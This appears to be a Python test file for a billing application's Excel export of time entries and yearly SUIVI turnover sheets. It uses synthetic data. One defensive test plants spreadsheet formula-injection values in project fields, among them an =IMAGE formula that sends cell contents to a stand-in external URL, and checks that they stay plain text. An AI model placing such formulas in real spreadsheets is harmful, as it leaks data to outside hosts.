"""Export .xlsx of the time entries with the structure of the base workbook (Decision Center billing-gsheet-export-mechanism = DOWNLOADABLE_EXCEL,
2026-10-07), with the SUIVI sheets rebuilt from Billing (billing-gsheet-export-scope = B). Synthetic data only, on a COPY of the staging database
(see test_import.py for the run command)."""
import io, sqlite3

import openpyxl

import app.app as m
from app import billing_rules as rules, forecast, gsheet_export as gx, historical_billing
from tests import test_rc19          # base class only


class Export(test_rc19.RC19):
    def download(self):
        r = self.c.get('/export/classeur.xlsx'); self.assertEqual(r.status_code, 200)
        self.assertIn('attachment; filename="time-sheet-billing-', r.headers['Content-Disposition'])
        return openpyxl.load_workbook(io.BytesIO(r.data))

    def cell_hours(self, ws, r):
        v = ws.cell(r, 8).value
        return ws.cell(r, 7).value - ws.cell(r, 6).value if isinstance(v, str) and v.startswith('=G') else v

    def test_sheet_names_follow_the_workbook(self):
        self.assertEqual([gx.sheet_name(2025, k) for k in (1, 2, 4, 7, 9)], ['JAN', 'FEV', 'AVR', 'JULY', 'SEPT'])
        self.assertEqual([gx.sheet_name(2026, k) for k in (2, 9, 10)] + [gx.sheet_name(2027, 1)], ['FEB 26', 'SEPT 26', 'OCT 26', 'JAN 27'])
        self.assertEqual(gx.decimal_hours('14:09'), 14.15)                                        # A-03: minutes / 60

    def test_one_sheet_per_month_with_the_workbook_s_columns_formulas_and_billing_s_hours(self):
        self.clock(self.pid, '2026-08-03', '13:15', '14:00', 'réunion')
        self.clock(self.pid, '2026-08-04', '22:00', '02:00', 'nuit')                              # across midnight: fin − début would be negative
        self.entry(self.pid2, '2026-08-05', 1.5, 'durée seule')
        self.clock(self.pid, '2026-09-01', '09:00', '10:20', 'septembre')
        c = m.db()
        try:      # an imported line whose declared hours differ from its times (kept as declared, rc19)
            c.execute("INSERT INTO entries(work_date,project_id,start_time,end_time,hours,description,source,source_ref) VALUES('2026-09-02',?,'14:09','15:15',1.0,'déclarée','historical_excel','SEPT 26!127')", (self.pid,))
            c.commit(); total = c.execute('SELECT SUM(hours) FROM entries').fetchone()[0]; n = c.execute('SELECT COUNT(*) FROM entries').fetchone()[0]
        finally: c.close()
        wb = self.download()
        months = [x for x in wb.sheetnames if x in ('AUG 26', 'SEPT 26')]; self.assertEqual(months, ['AUG 26', 'SEPT 26'])
        ws = wb['AUG 26']
        self.assertEqual([ws.cell(5, k).value for k in range(2, 10)], gx.HEAD)
        self.assertEqual(ws['B4'].value, '=SUM(H6:H8)'); self.assertEqual(ws['B2'].number_format, 'mmm-yy')
        rows = {ws.cell(r, 3).value: r for r in range(6, 9)}
        r = rows['réunion']; self.assertEqual((ws.cell(r, 6).value, ws.cell(r, 7).value, ws.cell(r, 8).value), (13.25, 14.0, f'=G{r}-F{r}'))
        r = rows['nuit']; self.assertEqual(ws.cell(r, 8).value, 4.0)                              # stored hours, not a negative formula
        r = rows['durée seule']; self.assertEqual((ws.cell(r, 6).value, ws.cell(r, 8).value), (None, 1.5))
        self.assertEqual(ws.cell(9, 8).value, '=SUBTOTAL(109,H6:H8)')
        s = wb['SEPT 26']; rs = {s.cell(r, 3).value: r for r in range(6, 8)}
        self.assertAlmostEqual(s.cell(rs['septembre'], 7).value - s.cell(rs['septembre'], 6).value, 80 / 60, places=6)
        self.assertEqual(s.cell(rs['déclarée'], 8).value, 1.0)                                  # 15.25 − 14.15 = 1.1 would not give the declared hours
        sheets = [w for w in wb.worksheets if not w.title.startswith('SUIVI ')]
        exported = sum(self.cell_hours(w, r) for w in sheets for r in range(6, w.max_row + 1) if w.cell(r, 2).value not in (None, 'Total') and w.cell(r, 8).value is not None)
        self.assertAlmostEqual(exported, total, places=6)
        self.assertEqual(sum(1 for w in sheets for r in range(6, w.max_row + 1) if w.cell(r, 2).value not in (None, 'Total') and w.cell(r, 8).value is not None), n)
        # recap: TOTAL H value, TOTAL J = H / hours per day, the mandate's days before the month linked to the previous sheet
        recap = {s.cell(r, 10).value: r for r in range(7, 9) if s.cell(r, 10).value}
        r = recap['Mandat RC19']
        self.assertEqual([s.cell(6, k).value for k in range(10, 19)], gx.RECAP)
        self.assertAlmostEqual(s.cell(r, 11).value, 80 / 60 + 1.0, places=6)
        self.assertEqual((s.cell(r, 12).value, s.cell(r, 15).value, s.cell(r, 17).value, s.cell(r, 18).value), (f'=K{r}/8', 20, f'=P{r}+L{r}', f'=O{r}-Q{r}'))
        prev = {ws.cell(x, 10).value: x for x in range(7, 9)}['Mandat RC19']
        self.assertEqual(s.cell(r, 16).value, f"='AUG 26'!Q{prev}")
        self.assertEqual(self.scalar("SELECT COUNT(*) FROM audit WHERE event='gsheet_export_downloaded'"), 1)

    def test_the_export_writes_nothing_but_its_audit_row(self):
        self.clock(self.pid, '2026-08-03', '13:15', '14:00', 'réunion')
        before = self.sql("SELECT COUNT(*) FROM entries")[0][0], self.sql("SELECT COUNT(*) FROM entry_changes")[0][0]
        self.download()
        self.assertEqual((self.sql("SELECT COUNT(*) FROM entries")[0][0], self.sql("SELECT COUNT(*) FROM entry_changes")[0][0]), before)

    def test_the_download_needs_a_session(self):
        self.c.post('/logout')
        r = self.c.get('/export/classeur.xlsx'); self.assertEqual(r.status_code, 302); self.assertIn('/login', r.headers['Location'])


class Suivi(Export):
    """billing-gsheet-export-scope = B: one SUIVI sheet per year, the documents of Billing's turnover in CHF (columns of the workbook's SUIVI 2026)."""
    def hist(self, pid, d, days, amount, cell, validate=True):
        c = m.db()
        try:
            hid = historical_billing.add_proposed(c, dict(project_id=pid, source_file='Time sheet CP.xlsx', source_sha256='abc', source_sheet=f'SUIVI {d[:4]}',
                                                          source_cell=cell, source_column='Facture', invoice_date=d, qty_days=days, amount_ht=amount,
                                                          unit_rate=amount / days, basis='days', qty_derived=0))
            c.commit()
        finally: c.close()
        if validate: self.c.post(f'/historique/{hid}/statut', data={'statut': 'validated', 'motif': ''})
        return hid

    def test_suivi_sheets_rebuild_the_turnover_of_each_year_from_billing(self):
        today = rules.local_today()
        self.entry(self.pid2, '2025-11-10', 4, 'novembre 2025'); self.entry(self.pid, '2026-09-10', 5, 'atelier')
        pid3 = self.mandate(name='Mandat sans facture', rate='700', ordered='3')
        self.hist(self.pid2, '2025-11-14', 2, 1000.0, 'J3')                                       # validated, 2025, mandate closed below
        self.hist(self.pid, '2026-03-31', 2, 1600.0, 'K4')                                        # validated, 2026
        self.entry(self.pid, '2026-03-30', 16, 'travail facturé hors application')                # the work the registry invoice billed: check 14 admits no invoice beyond the work recorded
        iid, fl = self.draft(self.pid, '2026-09-01', '2026-09-30', 0.625, invoice_date='2026-09-30'); self.issue(iid)
        self.assertEqual(self.scalar('SELECT status FROM invoices WHERE id=?', (iid,)), 'issued', self.flashes())
        self.c.post(f'/invoice/{iid}/credit', data={'reason': 'quart de jour non dû', 'qty': '0.25', 'treatment': 'remboursement'})
        cid = self.scalar('SELECT MAX(id) FROM credit_notes'); self.c.post(f'/credit/{cid}/issue')
        self.assertEqual(self.scalar('SELECT status FROM credit_notes WHERE id=?', (cid,)), 'issued', self.flashes())
        self.hist(self.pid, '2026-03-31', 1, 800.0, 'K9', validate=False)                         # proposed (after the issuance, check 5): counts for nothing
        self.c.post(f'/project/{self.pid2}/close', data={'reason': 'mandat terminé'})
        self.assertEqual(self.scalar('SELECT active FROM projects WHERE id=?', (self.pid2,)), 0)
        wb = self.download()
        names = wb.sheetnames                                                                      # after the year's last month sheet, as in the workbook
        self.assertLess(names.index('NOV'), names.index('SUIVI 2025')); self.assertLess(names.index('SUIVI 2025'), names.index('SEPT 26'))
        self.assertEqual(names.index('SUIVI 2026'), names.index('SEPT 26') + 1)
        s = wb['SUIVI 2026']; cn = f"Note de crédit {today.strftime('%d/%m')}"
        self.assertEqual(s['A1'].value, 2026)
        head = [s.cell(2, k).value for k in range(1, s.max_column + 1)]
        self.assertEqual(head, gx.SUIVI_HEAD + ['Facture 31/03', 'Facture 30/09', cn, 'Statut'])
        rows = {s.cell(r, 1).value: r for r in range(3, s.max_row + 1) if s.cell(r, 1).value}
        self.assertNotIn('Mandat RC19 bis', rows)                                                 # closed, nothing in 2026
        self.assertIn('Mandat sans facture', rows)                                                # open mandate of the current year
        r = rows['Mandat RC19']
        self.assertEqual([s.cell(r, k).value for k in range(1, 7)], ['Mandat RC19', '01-05 Sept 2026', 'Client Fictif SA', 'NP-TEST', 'PO-TEST-001', 20])
        self.assertAlmostEqual(s.cell(r, 7).value, 2 + 0.625 - 0.25, places=6)                   # NB J: historical + invoice − credited days
        self.assertEqual((s.cell(r, 8).value, s.cell(r, 9).value), (800, f'=SUM(J{r}:L{r})'))
        self.assertEqual([s.cell(r, k).value for k in range(10, 14)], [1600.0, 500.0, -200.0, None])
        self.assertEqual(s.cell(r, 10).number_format, gx.CHF_FMT)
        r3 = rows['Mandat sans facture']; self.assertEqual([s.cell(r3, k).value for k in (7, 10, 11, 12)], [0, None, None, None])
        last = max(rows.values()); tot = last + 1
        self.assertEqual((s.cell(tot, 8).value, s.cell(tot, 9).value, s.cell(tot, 10).value), ('CA', f'=SUBTOTAL(109,I3:I{last})', f'=SUM(J3:J{last})'))
        old = wb['SUIVI 2025']; ro = {old.cell(x, 1).value: x for x in range(3, old.max_row + 1) if old.cell(x, 1).value}
        self.assertEqual(list(ro), ['Mandat RC19 bis'])                                          # 2025: only the mandates with a document
        self.assertEqual([old.cell(ro['Mandat RC19 bis'], k).value for k in (10, 11)], [1000.0, 'TERMINE'])
        # the turnover of every sheet is Billing's « Facturé » of the year (forecast), to the cent
        c = m.db()
        try: fc = {y['year']: y['actual'] for y in forecast.build(c, today)['years']}; _, summ = gx.build(c)
        finally: c.close()
        self.assertEqual({y: str(v) for y, v in summ['suivi'].items()}, {y: str(fc[y]) for y in summ['suivi']})
        self.assertEqual(summ['suivi']['2026'], '1900.00'); self.assertEqual(summ['suivi']['2025'], '1000.00')
        for name, total in (('SUIVI 2026', 1900.0), ('SUIVI 2025', 1000.0)):
            w = wb[name]; n = len(gx.SUIVI_HEAD)
            self.assertAlmostEqual(sum(w.cell(x, k).value or 0 for x in range(3, w.max_row) for k in range(n + 1, w.max_column)), total, places=2)

    def test_a_cancelled_credit_note_leaves_the_suivi(self):
        self.entry(self.pid, '2026-09-10', 5, 'atelier')
        iid, fl = self.draft(self.pid, '2026-09-01', '2026-09-30', 0.625, invoice_date='2026-09-30'); self.issue(iid)
        self.c.post(f'/invoice/{iid}/credit', data={'reason': 'geste', 'amount': '100', 'treatment': 'remboursement'})
        cid = self.scalar('SELECT MAX(id) FROM credit_notes'); self.c.post(f'/credit/{cid}/issue')
        s = self.download()['SUIVI 2026']
        self.assertIn(f"Note de crédit {rules.local_today().strftime('%d/%m')}", [s.cell(2, k).value for k in range(1, s.max_column + 1)])
        self.c.post(f'/credit/{cid}/cancel', data={'reason': 'émise par erreur'})
        self.assertEqual(self.scalar('SELECT COUNT(*) FROM credit_note_cancellations WHERE credit_note_id=?', (cid,)), 1, self.flashes())
        s = self.download()['SUIVI 2026']
        self.assertEqual([s.cell(2, k).value for k in range(len(gx.SUIVI_HEAD) + 1, s.max_column + 1)], ['Facture 30/09', 'Statut'])

    def test_typed_text_stays_text_and_control_characters_do_not_break_the_export(self):
        pid = self.mandate(name='=IMAGE("https://x.invalid/?"&I3)', rate='700', ordered='3')
        self.c.post(f'/project/{pid}/edit', data={'name': '=IMAGE("https://x.invalid/?"&I3)', 'client': '=1+1', 'po': '=PO', 'rate': '700', 'ordered_days': '3',
                                                   'vat': '0', 'day_hours': '8', 'project_number': '=NP', 'dates_label': 'du 1\x0b au 5', 'billing_address': 'X\nY',
                                                   'start_date': '2025-11-01', 'duration_months': '11'})
        self.entry(pid, '2026-09-10', 2, '=> suite du point')
        c = m.db()
        try: c.execute("UPDATE projects SET client=? WHERE id=?", ('Client\x0bFictif', pid)); c.commit()     # as if pasted from Word
        finally: c.close()
        wb = self.download()
        s = wb['SEPT 26']; r = next(x for x in range(6, s.max_row + 1) if s.cell(x, 3).value == '=> suite du point')
        self.assertEqual((s.cell(r, 3).data_type, s.cell(r, 4).value, s.cell(r, 4).data_type), ('s', '=IMAGE("https://x.invalid/?"&I3)', 's'))
        u = wb['SUIVI 2026']; r = next(x for x in range(3, u.max_row + 1) if u.cell(x, 1).value == '=IMAGE("https://x.invalid/?"&I3)')
        self.assertEqual([u.cell(r, k).data_type for k in (1, 4, 5)], ['s', 's', 's'])
        self.assertEqual((u.cell(r, 3).value, u.cell(r, 2).value), ('ClientFictif', 'du 1 au 5'))
